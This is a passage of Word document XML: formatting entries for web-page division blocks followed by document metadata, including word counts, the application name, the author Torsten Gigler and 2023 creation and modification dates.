      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1735544641">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1740403700">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1939946280">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="20159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3EE03-4BDD-40E3-8DA9-CC7AF211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21014</Words>
  <Characters>132395</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>1103</Lines>
  <Paragraphs>306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Gigler</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Torsten Gigler</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <cp:lastPrinted>2023-06-17T17:55:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-06-14T08:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-06-17T17:59:00Z</dcterms:modified>
</cp:coreProperties>
</file>